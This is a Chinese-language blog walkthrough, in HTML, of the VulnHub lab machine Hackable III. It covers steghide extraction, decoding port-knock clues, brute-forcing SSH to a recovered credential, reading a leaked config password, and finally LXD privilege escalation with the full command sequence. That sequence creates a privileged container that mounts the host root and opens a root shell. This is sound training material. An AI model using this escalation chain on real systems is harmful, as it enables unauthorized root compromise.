@@ -1,0 +1,621 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://suc2es2.github.io';</script>
+  <title>
+    VulnHub Hackable：III | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="Hackable：III项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hackable&#x2F;hackable3.ova 是一个打包好的镜像文件 注意：导入 ovf 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  CTFStegHide 隐写访问其 80 端口的源代码信息，在其源代码信息中发现提示信息，根据提示信息猜测可能存在以下账户 1234jub">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub Hackable：III">
+<meta property="og:url" content="https://suc2es2.github.io/2026/07/31/Hackable%20III/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="Hackable：III项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hackable&#x2F;hackable3.ova 是一个打包好的镜像文件 注意：导入 ovf 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  CTFStegHide 隐写访问其 80 端口的源代码信息，在其源代码信息中发现提示信息，根据提示信息猜测可能存在以下账户 1234jub">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341jWwSrRhMQpnuspfmA7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341k0Zbvdz0u7M6rwXqff.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341k6jeKO51wXQcJpf3VK.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341kCUtf2fQDwjZZNhlhB.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341kJNeslUuQZ7e3fNUme.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341kheqsk42Mv8EoxalH8.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341kkKmLXa56ohXdM4aa7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341ksQc90ILUNZwhp8xoP.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341ktduT1y7lPVOeRDwps.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341kvHOoBBmYcRChVSjxB.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341lRN6l3Qfto7b36EsMA.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341lXRMQpCiH9P24RSC2K.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/0341lZ1s9B2aBCaVJtF0k1.png">
+<meta property="article:published_time" content="2026-07-31T08:29:00.000Z">
+<meta property="article:modified_time" content="2026-08-05T07:59:28.090Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="LXD 提权">
+<meta property="article:tag" content="Port Knocking">
+<meta property="article:tag" content="StegHide 隐写">
+<meta property="article:tag" content="弱口令">
+<meta property="article:tag" content="敏感信息泄露">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/i/0341jWwSrRhMQpnuspfmA7.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub Hackable：III">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub Hackable：III</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hackable%EF%BC%9AIII"><span class="toc-number">1.</span> <span class="toc-text">Hackable：III</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">1.1.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#StegHide-%E9%9A%90%E5%86%99"><span class="toc-number">1.1.1.</span> <span class="toc-text">StegHide 隐写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Knocking"><span class="toc-number">1.2.</span> <span class="toc-text">Port Knocking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.3.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.4.1.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LXD-%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.2.</span> <span class="toc-text">LXD 提权</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">226</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">183</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Hackable III" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-07-31T08:29:00.000Z" itemprop="datePublished">2026-07-31</time>
+    <time style="display: none;" id="post-update-time">2026-08-05</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Hackable：III"><a href="#Hackable：III" class="headerlink" title="Hackable：III"></a>Hackable：III</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/hackable/hackable3.ova">https://download.vulnhub.com/hackable/hackable3.ova</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 ovf 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<p><img src="https://pic1.imgdb.cn/i/0341jWwSrRhMQpnuspfmA7.png" alt="pasted_1785911710516_9iiztc.png"></p>
+<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><h3 id="StegHide-隐写"><a href="#StegHide-隐写" class="headerlink" title="StegHide 隐写"></a>StegHide 隐写</h3><p>访问其 80 端口的源代码信息，在其源代码信息中发现提示信息，根据提示信息猜测可能存在以下账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jubiscleudo</span><br><span class="line">hackable3</span><br><span class="line"></span><br><span class="line">Jubiscleudo，请务必记得在离开你负责的区域时激活端口敲击（port knocking），并提醒老板记得审批那个 .jpg 文件 —— dev_suport@hackable3.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/i/0341k0Zbvdz0u7M6rwXqff.png" alt="pasted_1785912875281_l8bxbu.png"></p>
+<p>扫描目录发现 <code>login.php</code>，访问直接显示了源码</p>
+<p><img src="https://pic1.imgdb.cn/i/0341k6jeKO51wXQcJpf3VK.png" alt="pasted_1785913122265_nvf5md.png"></p>
+<p>在源码中可以看到有个 <code>3.jpg</code>，结合提示信息使用 steghide 提取图片隐写信息，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">porta:65535</span><br></pre></td></tr></table></figure>
+
+<h2 id="Port-Knocking"><a href="#Port-Knocking" class="headerlink" title="Port Knocking"></a>Port Knocking</h2><p>访问 <code>/backup/</code> 目录，发现 <code>wordlist.txt</code> 文件</p>
+<p><img src="https://pic1.imgdb.cn/i/0341kCUtf2fQDwjZZNhlhB.png" alt="pasted_1785913349897_iovrvi.png"></p>
+<p>访问 <code>/config/</code> 发现 <code>1.txt</code> 文件，文件内容是 Base64 加密的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTAwMDA=</span><br></pre></td></tr></table></figure>
+
+<p>解密后得到 <code>10000</code></p>
+<p>访问 <code>/css/</code>，发现 <code>2.txt</code> 文件，在文件中发现加密信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;------------------....</span><br></pre></td></tr></table></figure>
+
+<p>在解密网站 <a target="_blank" rel="noopener" href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a> 进行解密</p>
+<p><img src="https://pic1.imgdb.cn/i/0341kJNeslUuQZ7e3fNUme.png" alt="pasted_1785913621068_t7icrj.png"></p>
+<p>根据之前的提示信息我们尝试使用获得端口进行敲门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口顺序是文件名顺序</span></span><br><span class="line">knock -v 192.168.246.10 10000 4444 65535</span><br></pre></td></tr></table></figure>
+
+<p>敲门后重新扫描发现开启 SSH 端口</p>
+<p><img src="https://pic1.imgdb.cn/i/0341kheqsk42Mv8EoxalH8.png" alt="pasted_1785914573887_scd9is.png"></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>使用上面找到的字典爆破成功登录，<code>jubiscleudo/onlymy</code></p>
+<p><img src="https://pic1.imgdb.cn/i/0341kkKmLXa56ohXdM4aa7.png" alt="pasted_1785914680843_pbogkc.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>经过一番查找在 <code>/var/www/html</code> 目录下发现一个隐藏文件 <code>.backup_config.php</code>，读取该文件内容获取到 hackable_3 账户的密码</p>
+<p><img src="https://pic1.imgdb.cn/i/0341ksQc90ILUNZwhp8xoP.png" alt="pasted_1785915002478_ir18wz.png"></p>
+<p>提权成功</p>
+<p><img src="https://pic1.imgdb.cn/i/0341ktduT1y7lPVOeRDwps.png" alt="pasted_1785915050829_s8liwh.png"></p>
+<h3 id="LXD-提权"><a href="#LXD-提权" class="headerlink" title="LXD 提权"></a>LXD 提权</h3><p>检查权限发现该用户在 LXD 组中</p>
+<p><img src="https://pic1.imgdb.cn/i/0341kvHOoBBmYcRChVSjxB.png" alt="pasted_1785915115265_vsmn0a.png"></p>
+<p>LXD 是一个以 root 权限运行的系统服务</p>
+<p>关键的安全缺陷在于，任何属 于lxd 或 lxc 用户组的成员，都有权通过 Unix 套接字与这个 root 进程通信，并让它执行管理命令</p>
+<p>系统不会去检查调用者的权限是否与其请求的操作相匹配</p>
+<p>提权具体步骤如下：</p>
+<ul>
+<li><p>导入一个容器镜像：首先，需要有一个容器镜像。这是运行容器的 “模板”</p>
+</li>
+<li><p>创建 “特权容器”：</p>
+<ul>
+<li><p>命令 <code>lxc init myimage ignite -c security.privileged=true</code> 创建了一个名为 <code>ignite</code> 的容器</p>
+</li>
+<li><p>参数 <code>security.privileged=true</code> 是核心。它告诉 LXD，这个容器是 “特权容器”</p>
+</li>
+<li><p><code>init</code> 表示创建，<code>myimage</code> 是源镜像</p>
+</li>
+</ul>
+</li>
+<li><p>挂载宿主机的根目录：</p>
+<ul>
+<li><p>命令 <code>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</code> 将主机的整个根目录 <code>/</code>，以磁盘设备的形式挂载到了容器内的 <code>/mnt/root</code> 路径下</p>
+</li>
+<li><p><code>lxc config device add</code> 表示动态设备添加，<code>ignite</code> 要操作的容器名</p>
+</li>
+<li><p><code>mydevice</code> 表示在 LXD 配置数据库中给这个 “设备” 起的内部别名</p>
+</li>
+<li><p><code>disk</code> 表示添加一个磁盘&#x2F;文件系统类型的设备</p>
+</li>
+<li><p><code>source=/</code> 表示来源路径，这里是宿主机的根目录</p>
+</li>
+<li><p><code>path=/mnt/root</code> 指定这个源路径在容器内部被挂载到什么位置</p>
+</li>
+<li><p><code>recursive=true</code> 表示开启递归</p>
+</li>
+</ul>
+</li>
+<li><p>获取并控制 <code>/mnt/root</code>：</p>
+<ul>
+<li><p><code>lxc start ignite</code> 启动容器</p>
+</li>
+<li><p><code>lxc exec ignite /bin/sh</code> 在容器内启动一个 <code>/bin/sh</code> shell</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>去 <a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder.git">https://github.com/saghul/lxd-alpine-builder.git</a> 上下载镜像文件并上传到靶机</p>
+<p><img src="https://pic1.imgdb.cn/i/0341lRN6l3Qfto7b36EsMA.png" alt="pasted_1785916380398_06qvuz.png"></p>
+<p>然后在依次执行如下命令，即可成功获得 root 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入镜像</span></span><br><span class="line">lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化，一路回车默认就行</span></span><br><span class="line">lxd init</span><br><span class="line"></span><br><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/i/0341lXRMQpCiH9P24RSC2K.png" alt="pasted_1785916617023_kovhkv.png"></p>
+<p>成功拿到 flag</p>
+<p><img src="https://pic1.imgdb.cn/i/0341lZ1s9B2aBCaVJtF0k1.png" alt="pasted_1785916683058_bpx75y.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/LXD-%E6%8F%90%E6%9D%83/" rel="tag" title="LXD 提权">LXD 提权</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Port-Knocking/" rel="tag" title="Port Knocking">Port Knocking</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/StegHide-%E9%9A%90%E5%86%99/" rel="tag" title="StegHide 隐写">StegHide 隐写</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" rel="tag" title="弱口令">弱口令</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag" title="敏感信息泄露">敏感信息泄露</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Grotesque：3.0.1" class="lazyload">
+        <a href="/2026/07/31/Grotesque%203.0.1/" aria-label="前一篇: VulnHub Grotesque：3.0.1" title="前一篇: VulnHub Grotesque：3.0.1"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            VulnHub Grotesque：3.0.1
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Pwn The Tron：1" class="lazyload">
+      <a href="/2026/07/31/Pwn%20The%20Tron%201/" aria-label="后一篇: VulnHub Pwn The Tron：1"  title="后一篇: VulnHub Pwn The Tron：1"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub Pwn The Tron：1
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        259.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        21:19
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hackable%EF%BC%9AIII"><span class="toc-number">1.</span> <span class="toc-text">Hackable：III</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">1.1.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#StegHide-%E9%9A%90%E5%86%99"><span class="toc-number">1.1.1.</span> <span class="toc-text">StegHide 隐写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Knocking"><span class="toc-number">1.2.</span> <span class="toc-text">Port Knocking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.3.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.4.1.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LXD-%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.2.</span> <span class="toc-text">LXD 提权</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">226</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">183</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
